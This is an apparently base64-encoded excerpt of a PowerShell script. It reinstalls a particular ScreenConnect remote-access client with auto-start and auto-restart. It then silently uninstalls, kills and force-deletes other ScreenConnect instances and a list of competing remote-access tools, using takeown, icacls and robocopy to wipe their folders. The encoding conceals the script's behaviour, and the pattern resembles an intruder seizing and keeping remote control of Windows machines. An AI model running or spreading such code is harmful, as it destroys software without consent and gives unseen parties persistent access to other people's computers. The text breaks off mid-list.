cmV0dXJuICJVTkhFQUxUSFl8JG9sZEZwfG1zaS1mcC1wYXJzZS1mYWlsIgogICAgfQogICAgR0xv
ZyAibXNpX2ZwPSRuZXdGcCBwcm9kdWN0PSRwcm9kTmFtZSIKCiAgICAkbmVlZFJlaW5zdGFsbCA9
IFtib29sXSRGb3JjZQogICAgaWYgKCRuZXdGcCAtbmUgJG9sZEZwKSB7CiAgICAgICAgR0xvZyAi
ZnBfZHJpZnQgb2xkPSRvbGRGcCBuZXc9JG5ld0ZwIgogICAgICAgICRuZWVkUmVpbnN0YWxsID0g
JHRydWUKICAgIH0KICAgICRoZWFsdGggPSBUZXN0LUdyeXhhSGVhbHRoCiAgICBHTG9nICJwcmVf
aGVhbHRoPSRoZWFsdGgiCiAgICBpZiAoJGhlYWx0aCAtbm90bGlrZSAnSEVBTFRIWSonKSB7ICRu
ZWVkUmVpbnN0YWxsID0gJHRydWUgfQogICAgIyBEZWVwIGFsd2F5cyB2ZXJpZmllcyBUQ1AgaGFy
ZCByZXF1aXJlbWVudAogICAgJHRjcFJlbGF5ID0gVGVzdC1UY3BIb3N0UG9ydCAkc2NyaXB0Okdy
eXhhUmVsYXlIb3N0IDQ0MwogICAgJHRjcFVpID0gVGVzdC1UY3BIb3N0UG9ydCAkc2NyaXB0Okdy
eXhhVWlIb3N0IDQ0MwogICAgaWYgKC1ub3QgJHRjcFJlbGF5IC1hbmQgLW5vdCAkdGNwVWkpIHsK
ICAgICAgICBHTG9nICd0Y3BfYm90aF9mYWlsX3N0aWxsX3RyeV9pbnN0YWxsJwogICAgICAgICRu
ZWVkUmVpbnN0YWxsID0gJHRydWUKICAgIH0KCiAgICBpZiAoLW5vdCAkbmVlZFJlaW5zdGFsbCkg
ewogICAgICAgIFNldC1Hcnl4YUZwICRuZXdGcAogICAgICAgIEdMb2cgImRlZXBfaGVhbHRoeV9u
b19yZWluc3RhbGwgJGhlYWx0aCIKICAgICAgICByZXR1cm4gJGhlYWx0aAogICAgfQoKICAgICMg
VW5pbnN0YWxsIG9sZCBGUCBpZiBkaWZmZXJlbnQgb3IgYnJva2VuOyBhbHNvIHVuaW5zdGFsbCBu
ZXcgRlAgaWYgcGFydGlhbGx5IHByZXNlbnQKICAgIGlmICgkb2xkRnAgLWFuZCAkb2xkRnAgLW5l
ICRuZXdGcCkgewogICAgICAgIEdMb2cgInVuaW5zdGFsbF9vbGRfZnA9JG9sZEZwIgogICAgICAg
IFVuaW5zdGFsbC1TY0ZpbmdlcnByaW50ICRvbGRGcCB8IE91dC1OdWxsCiAgICB9CiAgICBpZiAo
RmluZC1Qcm9kdWN0R3VpZCAkbmV3RnApIHsKICAgICAgICBHTG9nICJ1bmluc3RhbGxfZXhpc3Rp
bmdfbmV3X2ZwPSRuZXdGcCIKICAgICAgICBVbmluc3RhbGwtU2NGaW5nZXJwcmludCAkbmV3RnAg
fCBPdXQtTnVsbAogICAgfQoKICAgIFNldC1Hcnl4YUZwICRuZXdGcAogICAgJGV4aXQgPSBJbnN0
YWxsLUdyeXhhRnJvbU1zaSAkbXNpCiAgICBHTG9nICJtc2lleGVjX2V4aXQ9JGV4aXQiCgogICAg
JG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRuZXdGcCkiCiAgICAmIHNjLmV4ZSBjb25m
aWcgJG5hbWUgc3RhcnQ9IGF1dG8gMj4mMSB8IE91dC1OdWxsCiAgICAmIHNjLmV4ZSBmYWlsdXJl
ICRuYW1lIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzMwMDAvcmVzdGFydC8zMDAwL3Jl
c3RhcnQvMzAwMCAyPiYxIHwgT3V0LU51bGwKICAgICYgc2MuZXhlIHN0YXJ0ICRuYW1lIDI+JjEg
fCBPdXQtTnVsbAogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNQogICAgJiBzYy5leGUgc3RhcnQg
JG5hbWUgMj4mMSB8IE91dC1OdWxsCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA1CgogICAgIyBu
dWRnZSBzZXZyeiBrZWVwZXJzIGFmdGVyIGdyeXhhIG1zaWV4ZWMKICAgIGZvcmVhY2ggKCRrZnAg
aW4gQCgnNWY2MDEwNTc5ODUyZTUwNycsICdmODYxYzgxNDBkNDUzNDI3JykpIHsKICAgICAgICAk
a24gPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRrZnApIgogICAgICAgICYgc2MuZXhlIHN0YXJ0
ICRrbiAyPiYxIHwgT3V0LU51bGwKICAgICAgICBpZiAoLW5vdCAoR2V0LVNlcnZpY2UgLU5hbWUg
JGtuIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgewogICAgICAgICAgICBSZXBhaXIt
U0NTZXJ2aWNlICRrZnAgfCBPdXQtTnVsbAogICAgICAgIH0KICAgIH0KCiAgICBpZiAoKEdldC1T
ZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5TdGF0dXMg
LW5lICdSdW5uaW5nJykgewogICAgICAgIFJlcGFpci1TQ1NlcnZpY2UgJG5ld0ZwIHwgT3V0LU51
bGwKICAgIH0KCiAgICAkZmluYWwgPSBUZXN0LUdyeXhhSGVhbHRoCiAgICBHTG9nICJwb3N0X2hl
YWx0aD0kZmluYWwiCiAgICByZXR1cm4gJGZpbmFsCn0KCmZ1bmN0aW9uIEludm9rZS1FeHRlcm1p
bmF0ZSB7CiAgICAjIEw3OiB0cnVlIHJlbW92YWwuIENvcnJlY3QgV09XNjQzMk5vZGUgaGl2ZSAr
IG1zaWV4ZWMgKyBVbmluc3RhbGxTdHJpbmcKICAgICMgZmFsbGJhY2sgKyBmb3JjZSBkaXIgbnVr
ZS4gS2VlcCBzZXZyeithbHQrY3VycmVudCBncnl4YSBGUCAoZ3J5eGEuY2ZnKS4KICAgICRsb2cg
PSBKb2luLVBhdGggJFdvcmtEaXIgJ2V4dGVybWluYXRlLmxvZycKICAgICRrZWVwID0gQChHZXQt
S2VlcEZpbmdlcnByaW50cykKICAgICRuID0gQHsgc3ZjID0gMDsgcHJvYyA9IDA7IGRpciA9IDA7
IHByb2R1Y3QgPSAwOyBybW0gPSAwOyBmYWlsID0gMCB9CiAgICBmdW5jdGlvbiBMb2coW3N0cmlu
Z10kbSkgewogICAgICAgICRsaW5lID0gJ3swfSB7MX0nIC1mIChHZXQtRGF0ZSAtRm9ybWF0ICd5
eXl5LU1NLWRkIEhIOm1tOnNzJyksICRtCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRo
ICRsb2cgLVZhbHVlICRsaW5lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAg
V3JpdGUtT3V0cHV0ICRsaW5lCiAgICB9CiAgICBmdW5jdGlvbiBJcy1LZWVwZXIoW3N0cmluZ10k
cykgewogICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAkZmFsc2UgfQogICAgICAgIGZvcmVh
Y2ggKCRrIGluICRrZWVwKSB7IGlmICgkcyAtbGlrZSAiKiRrKiIpIHsgcmV0dXJuICR0cnVlIH0g
fQogICAgICAgIHJldHVybiAkZmFsc2UKICAgIH0KICAgIGZ1bmN0aW9uIEZvcmNlLVJlbW92ZURp
cihbc3RyaW5nXSRkKSB7CiAgICAgICAgaWYgKC1ub3QgJGQgLW9yIC1ub3QgKFRlc3QtUGF0aCAt
TGl0ZXJhbFBhdGggJGQpKSB7IHJldHVybiAkdHJ1ZSB9CiAgICAgICAgR2V0LUNpbUluc3RhbmNl
IFdpbjMyX1Byb2Nlc3MgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAg
ICBXaGVyZS1PYmplY3QgeyAkXy5FeGVjdXRhYmxlUGF0aCAtYW5kICRfLkV4ZWN1dGFibGVQYXRo
LlN0YXJ0c1dpdGgoJGQsIFtTdHJpbmdDb21wYXJpc29uXTo6T3JkaW5hbElnbm9yZUNhc2UpIH0g
fAogICAgICAgICAgICBGb3JFYWNoLU9iamVjdCB7IFN0b3AtUHJvY2VzcyAtSWQgJF8uUHJvY2Vz
c0lkIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB9CiAgICAgICAgJiB0YWtl
b3duLmV4ZSAvRiAkZCAvUiAvRCBZIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICYgaWNhY2xzLmV4
ZSAkZCAvZ3JhbnQgJypTLTEtNS0zMi01NDQ6RicgL1QgL0MgL1EgMj4mMSB8IE91dC1OdWxsCiAg
ICAgICAgJiBpY2FjbHMuZXhlICRkIC9ncmFudCAnQWRtaW5pc3RyYXRvcnM6RicgL1QgL0MgL1Eg
Mj4mMSB8IE91dC1OdWxsCiAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRkIC1SZWN1
cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgIGlmIChUZXN0
LVBhdGggLUxpdGVyYWxQYXRoICRkKSB7CiAgICAgICAgICAgIGNtZC5leGUgL2MgImF0dHJpYiAt
aCAtcyAtciAvcyAvZCBgIiRkXCouKmAiIiAyPiYxIHwgT3V0LU51bGwKICAgICAgICAgICAgY21k
LmV4ZSAvYyAicm1kaXIgL3MgL3EgYCIkZGAiIiAyPiYxIHwgT3V0LU51bGwKICAgICAgICB9CiAg
ICAgICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpIHsKICAgICAgICAgICAgJGVtcHR5
ID0gSm9pbi1QYXRoICRlbnY6VEVNUCAoIm93bl9lbXB0eV8iICsgW2d1aWRdOjpOZXdHdWlkKCku
VG9TdHJpbmcoJ04nKSkKICAgICAgICAgICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAt
UGF0aCAkZW1wdHkgLUZvcmNlIHwgT3V0LU51bGwKICAgICAgICAgICAgJiByb2JvY29weS5leGUg
JGVtcHR5ICRkIC9NSVIgL1I6MCAvVzowIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICAgICBSZW1v
dmUtSXRlbSAtTGl0ZXJhbFBhdGggJGVtcHR5IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
b250aW51ZQogICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGQgLVJlY3Vyc2Ug
LUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgfQogICAgICAgIHJl
dHVybiAtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKQogICAgfQogICAgZnVuY3Rpb24g
VW5pbnN0YWxsLVByb2R1Y3RLZXkoJGtleSkgewogICAgICAgICRndWlkID0gJGtleS5QU0NoaWxk
TmFtZQogICAgICAgICRwcm9wID0gR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgICRkbiA9ICRwcm9wLkRpc3BsYXlOYW1lCiAg
ICAgICAgaWYgKCRndWlkIC1saWtlICd7Kn0nKSB7CiAgICAgICAgICAgICRwID0gU3RhcnQtUHJv
Y2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIveCAkZ3VpZCAvcW4gL25vcmVzdGFydCBS
RUJPT1Q9UmVhbGx5U3VwcHJlc3MiIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVu
CiAgICAgICAgICAgIExvZyAicHJvZHVjdF9tc2lleGVjIFskZG5dIGd1aWQ9JGd1aWQgZXhpdD0k
KCRwLkV4aXRDb2RlKSIKICAgICAgICAgICAgaWYgKCRwLkV4aXRDb2RlIC1pbiAwLCAxNjA1LCAx
NjE0LCAzMDEwKSB7IHJldHVybiAkdHJ1ZSB9CiAgICAgICAgfQogICAgICAgICR1cyA9ICRwcm9w
LlVuaW5zdGFsbFN0cmluZwogICAgICAgIGlmICgkdXMpIHsKICAgICAgICAgICAgdHJ5IHsKICAg
ICAgICAgICAgICAgIGlmICgkdXMgLW1hdGNoICcoP2kpbXNpZXhlYycpIHsKICAgICAgICAgICAg
ICAgICAgICAkYXJncyA9ICgkdXMgLXJlcGxhY2UgJyg/aSleLiptc2lleGVjKFwuZXhlKT9ccyon
LCAnJykKICAgICAgICAgICAgICAgICAgICBpZiAoJGFyZ3MgLW5vdG1hdGNoICcvcW4nKSB7ICRh
cmdzID0gIiRhcmdzIC9xbiAvbm9yZXN0YXJ0IiB9CiAgICAgICAgICAgICAgICAgICAgJHAgPSBT
dGFydC1Qcm9jZXNzIG1zaWV4ZWMuZXhlIC1Bcmd1bWVudExpc3QgJGFyZ3MgLVdhaXQgLVBhc3NU
aHJ1IC1XaW5kb3dTdHlsZSBIaWRkZW4KICAgICAgICAgICAgICAgICAgICBMb2cgInByb2R1Y3Rf
dW5pbnN0YWxsc3RyaW5nX21zaSBbJGRuXSBleGl0PSQoJHAuRXhpdENvZGUpIgogICAgICAgICAg
ICAgICAgICAgIHJldHVybiAoJHAuRXhpdENvZGUgLWluIDAsIDE2MDUsIDE2MTQsIDMwMTApCiAg
ICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRwID0gU3RhcnQtUHJv
Y2VzcyBjbWQuZXhlIC1Bcmd1bWVudExpc3QgIi9jICR1cyAvUyAvc2lsZW50IC9xdWlldCAvcW4i
IC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgICAgICAgICAgICAg
TG9nICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19leGUgWyRkbl0gZXhpdD0kKCRwLkV4aXRDb2Rl
KSIKICAgICAgICAgICAgICAgICAgICByZXR1cm4gKCRwLkV4aXRDb2RlIC1lcSAwKQogICAgICAg
ICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIHsgTG9nICJwcm9kdWN0X3VuaW5zdGFsbHN0
cmluZ19GQUlMIFskZG5dICRfIiB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkZmFsc2UKICAg
IH0KCiAgICBMb2cgJ2V4dGVybWluYXRlX2VuZ2luZV9MN19iZWdpbicKCiAgICAjIDEuIGZvcmVp
Z24gU0MgcHJvZHVjdHMgZnJvbSBCT1RIIGNvcnJlY3QgQVJQIGhpdmVzCiAgICAkc2VlbiA9IEB7
fQogICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykgewogICAgICAg
IGlmICgtbm90IChUZXN0LVBhdGggJHJvb3QpKSB7IExvZyAiaGl2ZV9taXNzaW5nICRyb290Ijsg
Y29udGludWUgfQogICAgICAgIExvZyAiaGl2ZV9zY2FuICRyb290IgogICAgICAgIEdldC1DaGls
ZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVj
dCB7CiAgICAgICAgICAgICRwcm9wID0gR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgJGRuID0gJHByb3AuRGlzcGxheU5h
bWUKICAgICAgICAgICAgaWYgKC1ub3QgJGRuKSB7IHJldHVybiB9CiAgICAgICAgICAgIGlmICgk
ZG4gLW5vdG1hdGNoICcoP2kpU2NyZWVuQ29ubmVjdFxzK0NsaWVudFxzKlwoKFswLTlBLUZhLWZd
ezE2fSlcKScpIHsgcmV0dXJuIH0KICAgICAgICAgICAgJGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dl
cigpCiAgICAgICAgICAgIGlmICgkZnAgLWluICRrZWVwKSB7IHJldHVybiB9CiAgICAgICAgICAg
IGlmICgkc2Vlbi5Db250YWluc0tleSgkXy5QU0NoaWxkTmFtZSkpIHsgcmV0dXJuIH0KICAgICAg
ICAgICAgJHNlZW5bJF8uUFNDaGlsZE5hbWVdID0gJHRydWUKICAgICAgICAgICAgaWYgKFVuaW5z
dGFsbC1Qcm9kdWN0S2V5ICRfKSB7ICRuLnByb2R1Y3QrKyB9IGVsc2UgeyAkbi5mYWlsKys7IExv
ZyAicHJvZHVjdF9SRU1PVkVfRkFJTEVEIFskZG5dIiB9CiAgICAgICAgfQogICAgfQoKICAgICMg
Mi4gZm9yZWlnbiBTQyBzZXJ2aWNlcwogICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2Ug
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1s
aWtlICdTY3JlZW5Db25uZWN0IENsaWVudConIH0pKSB7CiAgICAgICAgaWYgKElzLUtlZXBlciAk
c3ZjLk5hbWUpIHsgY29udGludWUgfQogICAgICAgICYgc2MuZXhlIHN0b3AgIiQoJHN2Yy5OYW1l
KSIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA2MDAK
ICAgICAgICAmIHNjLmV4ZSBkZWxldGUgIiQoJHN2Yy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAg
ICAgICAgJG4uc3ZjKys7IExvZyAic3ZjX2RlbGV0ZWQgJCgkc3ZjLk5hbWUpIgogICAgfQoKICAg
ICMgMy4gZm9yZWlnbiBTQyBwcm9jZXNzZXMgKGtpbGwgZXZlbiB3aGVuIEV4ZWN1dGFibGVQYXRo
IGlzIG51bGwpCiAgICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRmlsdGVyICJOYW1l
IGxpa2UgJ1NjcmVlbkNvbm5lY3QlJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBG
b3JFYWNoLU9iamVjdCB7CiAgICAgICAgJGV4ZSA9ICRfLkV4ZWN1dGFibGVQYXRoCiAgICAgICAg
JGNtZCA9ICRfLkNvbW1hbmRMaW5lCiAgICAgICAgJGtlZXBlciA9IChJcy1LZWVwZXIgJGV4ZSkg
LW9yIChJcy1LZWVwZXIgJGNtZCkKICAgICAgICBpZiAoLW5vdCAka2VlcGVyKSB7CiAgICAgICAg
ICAgIFN0b3AtUHJvY2VzcyAtSWQgJF8uUHJvY2Vzc0lkIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZQogICAgICAgICAgICAkbi5wcm9jKys7IExvZyAicHJvY19raWxsZWQgcGlk
PSQoJF8uUHJvY2Vzc0lkKSBleGU9JGV4ZSIKICAgICAgICB9CiAgICB9CgogICAgIyA0LiBmb3Jl
aWduIFNDIGluc3RhbGwgZGlycyAoUEYgKyBQRjg2KQogICAgZm9yZWFjaCAoJGJhc2UgaW4gQCgk
ZW52OlByb2dyYW1GaWxlcywgJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9KSkgewogICAgICAgIGlm
ICgtbm90ICRiYXNlIC1vciAtbm90IChUZXN0LVBhdGggJGJhc2UpKSB7IGNvbnRpbnVlIH0KICAg
ICAgICBHZXQtQ2hpbGRJdGVtIC1MaXRlcmFsUGF0aCAkYmFzZSAtRGlyZWN0b3J5IC1Gb3JjZSAt
RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7
ICRfLk5hbWUgLWxpa2UgJ1NjcmVlbkNvbm5lY3QqJyB9IHwgRm9yRWFjaC1PYmplY3QgewogICAg
ICAgICAgICAgICAgJGQgPSAkXy5GdWxsTmFtZQogICAgICAgICAgICAgICAgaWYgKElzLUtlZXBl
ciAkZCkgeyByZXR1cm4gfQogICAgICAgICAgICAgICAgaWYgKEZvcmNlLVJlbW92ZURpciAkZCkg
eyAkbi5kaXIrKzsgTG9nICJkaXJfcmVtb3ZlZCAkZCIgfQogICAgICAgICAgICAgICAgZWxzZSB7
ICRuLmZhaWwrKzsgTG9nICJkaXJfUkVNT1ZFX0ZBSUxFRCAkZCIgfQogICAgICAgICAgICB9CiAg
ICB9CgogICAgIyA1LiBkaXNhbGxvd2VkIFJNTSAvIHJlbW90ZS1hY2Nlc3MgdG9vbHMgKG1hcmtl
dCBjb3ZlcmFnZSAyMDI2KS4KICAgICMgS0VFUCBmb3JldmVyOiBEYXR0by9DZW50cmFTdGFnZSAr
IFNjcmVlbkNvbm5lY3Qga2VlcCBGUHMgKGhhbmRsZWQgYWJvdmUpLgogICAgIyBORVZFUiBwdXQg
RGF0dG8vQ2VudHJhU3RhZ2UvQ2FnU2VydmljZSBpbiB0aGlzIGxpc3QuCiAgICBmdW5jdGlvbiBJ
cy1EYXR0b0tlZXBlcihbc3RyaW5nXSRzKSB7CiAgICAgICAgaWYgKC1ub3QgJHMpIHsgcmV0dXJu
ICRmYWxzZSB9CiAgICAgICAgcmV0dXJuIFtib29sXSgkcyAtbWF0Y2ggJyg/aSlEYXR0b3xDZW50
cmFTdGFnZXxDYWdTZXJ2aWNlfEF1dG90YXNrRW5kcG9pbnQnKQogICAgfQogICAgJHJtbSA9IEAo
CiAgICAgICAgQHsgVGFnPSdBbnlEZXNrJzsgICAgICBTdmM9QCgnQW55RGVzaycpOyBQcm9jPUAo
J0FueURlc2snKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBbnlEZXNrIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XEFueURlc2siLCIkZW52OlByb2dyYW1EYXRhXEFueURlc2siKTsgUHJv
ZD1AKCdBbnlEZXNrKicpIH0KICAgICAgICBAeyBUYWc9J1RlYW1WaWV3ZXInOyAgIFN2Yz1AKCdU
ZWFtVmlld2VyKicpOyBQcm9jPUAoJ1RlYW1WaWV3ZXIqJywndHZfdzMyKicsJ3R2X3g2NConKTsg
RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xUZWFtVmlld2VyIiwiJHtlbnY6UHJvZ3JhbUZpbGVz
KHg4Nil9XFRlYW1WaWV3ZXIiKTsgUHJvZD1AKCdUZWFtVmlld2VyKicpIH0KICAgICAgICBAeyBU
YWc9J1NwbGFzaHRvcCc7ICAgIFN2Yz1AKCdTcGxhc2h0b3AqJywnU1JTZXJ2aWNlJywnU1NVU2Vy
dmljZScpOyBQcm9jPUAoJ1NwbGFzaHRvcConLCdzdHJ3aW5jbHQqJywnU1JNYW5hZ2VyKicpOyBE
aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNwbGFzaHRvcCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfVxTcGxhc2h0b3AiKTsgUHJvZD1AKCdTcGxhc2h0b3AqJykgfQogICAgICAgIEB7IFRhZz0n
TG9nTWVJbic7ICAgICAgU3ZjPUAoJ0xvZ01lSW4nLCdMTUlHdWFyZGlhblN2YycsJ0xNSWlnbml0
aW9uJyk7IFByb2M9QCgnTG9nTWVJbionLCdMTUlHdWFyZGlhbionLCdSYVNlcnZlcionKTsgRGly
cz1AKCIkZW52OlByb2dyYW1GaWxlc1xMb2dNZUluIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
XExvZ01lSW4iKTsgUHJvZD1AKCdMb2dNZUluKicpIH0KICAgICAgICBAeyBUYWc9J0dvVG8nOyAg
ICAgICAgIFN2Yz1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0KicsJ0dvVG9SZXNvbHZlKicpOyBQ
cm9jPUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Npc3QqJywnZzJtKicsJ0dvVG9SZXNvbHZlKicpOyBE
aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdvVG9NeVBDIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XEdvVG9NeVBDIik7IFByb2Q9QCgnR29Ub015UEMqJywnR29Ub0Fzc2lzdConLCdHb1RvIFJl
c29sdmUqJywnR29Ub01lZXRpbmcqJywnR29UbyBDb25uZWN0KicpIH0KICAgICAgICBAeyBUYWc9
J1J1c3REZXNrJzsgICAgIFN2Yz1AKCdSdXN0RGVzaycsJ3J1c3RkZXNrKicpOyBQcm9jPUAoJ3J1
c3RkZXNrKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJ1c3REZXNrIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XFJ1c3REZXNrIik7IFByb2Q9QCgnUnVzdERlc2sqJykgfQogICAgICAg
IEB7IFRhZz0nU3VwcmVtbyc7ICAgICAgU3ZjPUAoJ1N1cHJlbW8qJyk7IFByb2M9QCgnU3VwcmVt
byonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTdXByZW1vIiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XFN1cHJlbW8iKTsgUHJvZD1AKCdTdXByZW1vKicpIH0KICAgICAgICBAeyBUYWc9
J0RXU2VydmljZSc7ICAgIFN2Yz1AKCdEV0FnZW50JywnZHdhZ2VudConKTsgUHJvYz1AKCdkd2Fn
ZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXERXQWdlbnQiLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cRFdBZ2VudCIsIiRlbnY6UHJvZ3JhbURhdGFcRFdBZ2VudCIpOyBQcm9kPUAo
J0RXQWdlbnQqJywnRFdTZXJ2aWNlKicpIH0KICAgICAgICBAeyBUYWc9J1pvaG9Bc3Npc3QnOyAg
IFN2Yz1AKCdab2hvQXNzaXN0KicsJ1pvaG9NZWV0aW5nKicpOyBQcm9jPUAoJ1pvaG9Bc3Npc3Qq
JywnWm9ob1VSU0IqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcWm9ob01lZXRpbmciLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cWm9ob01lZXRpbmciKTsgUHJvZD1AKCdab2hvIEFzc2lz
dConLCdab2hvTWVldGluZyonKSB9CiAgICAgICAgQHsgVGFnPSdSZW1vdGVQQyc7ICAgICBTdmM9
QCgnUmVtb3RlUEMqJyk7IFByb2M9QCgnUmVtb3RlUEMqJywnUlBDU3VpdGUqJyk7IERpcnM9QCgi
JGVudjpQcm9ncmFtRmlsZXNcUmVtb3RlUEMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUmVt
b3RlUEMiKTsgUHJvZD1AKCdSZW1vdGVQQyonKSB9CiAgICAgICAgQHsgVGFnPSdCb21nYXInOyAg
ICAgICBTdmM9QCgnYm9tZ2FyKicsJ0JleW9uZFRydXN0KicpOyBQcm9jPUAoJ2JvbWdhcionKTsg
RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xCb21nYXIiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
KX1cQm9tZ2FyIiwiJGVudjpQcm9ncmFtRmlsZXNcQmV5b25kVHJ1c3QiLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cQmV5b25kVHJ1c3QiKTsgUHJvZD1AKCdCb21nYXIqJywnQmV5b25kVHJ1c3Qq
JykgfQogICAgICAgIEB7IFRhZz0nUGFyc2VjJzsgICAgICAgU3ZjPUAoJ1BhcnNlYyonKTsgUHJv
Yz1AKCdwYXJzZWNkKicsJ3BzZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFBh
cnNlYyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQYXJzZWMiLCIkZW52OlByb2dyYW1EYXRh
XFBhcnNlYyIpOyBQcm9kPUAoJ1BhcnNlYyonKSB9CiAgICAgICAgQHsgVGFnPSdDaHJvbWVSRCc7
ICAgICBTdmM9QCgnY2hyb21vdGluZyonKTsgUHJvYz1AKCdyZW1vdGluZ19ob3N0KicpOyBEaXJz
PUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdvb2dsZVxDaHJvbWUgUmVtb3RlIERlc2t0b3AiLCIke2Vu
djpQcm9ncmFtRmlsZXMoeDg2KX1cR29vZ2xlXENocm9tZSBSZW1vdGUgRGVza3RvcCIpOyBQcm9k
PUAoJ0Nocm9tZSBSZW1vdGUgRGVza3RvcConKSB9CiAgICAgICAgQHsgVGFnPSdVbHRyYVZOQyc7
ICAgICBTdmM9QCgndXZuYyonLCd3aW52bmMqJyk7IFByb2M9QCgnd2ludm5jKicsJ3V2bmMqJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcVWx0cmFWTkMiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cVWx0cmFWTkMiKTsgUHJvZD1AKCdVbHRyYVZOQyonLCdXaW5WTkMqJykgfQogICAgICAg
IEB7IFRhZz0nVGlnaHRWTkMnOyAgICAgU3ZjPUAoJ3R2bnNlcnZlcionKTsgUHJvYz1AKCd0dm5z
ZXJ2ZXIqJywndHZudmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFRpZ2h0Vk5D
IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFRpZ2h0Vk5DIik7IFByb2Q9QCgnVGlnaHRWTkMq
JykgfQogICAgICAgIEB7IFRhZz0nUmVhbFZOQyc7ICAgICAgU3ZjPUAoJ3ZuY3NlcnZlcionKTsg
UHJvYz1AKCd2bmNzZXJ2ZXIqJywndm5jdmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
